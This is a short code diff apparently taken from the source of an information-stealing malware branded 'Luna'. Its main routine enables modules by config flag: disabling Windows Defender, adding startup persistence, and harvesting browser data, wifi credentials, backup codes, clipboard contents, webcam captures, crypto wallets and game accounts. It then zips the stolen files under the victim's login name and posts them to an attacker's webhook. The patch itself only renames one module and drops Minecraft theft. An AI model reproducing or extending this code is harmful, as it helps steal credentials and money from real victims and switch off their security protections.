@@ -22,15 +22,13 @@ def main(webhook: str):
     if __CONFIG__["fakeerror"]:
         threads.append(fakeerror)
     if __CONFIG__["startup"]:
-        threads.append(startup)
+        threads.append(Startup)
     if __CONFIG__["defender"]:
         threads.append(disable_defender)
     if __CONFIG__["browser"]:
         threads.append(Browsers)
     if __CONFIG__["wifi"]:
         threads.append(Wifi)
-    if __CONFIG__["minecraft"]:
-        threads.append(Minecraft)
     if __CONFIG__["backupcodes"]:
         threads.append(BackupCodes)
     if __CONFIG__["clipboard"]:
@@ -67,7 +65,7 @@ def main(webhook: str):
             content = f"@{__CONFIG__['pingtype'].lower()}"
             data.update({"content": content})
 
-    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard", "webcam", "wallets", "games"]):
+    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "backupcodes", "clipboard", "webcam", "wallets", "games"]):
         with open(_file, 'rb') as file:
             encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
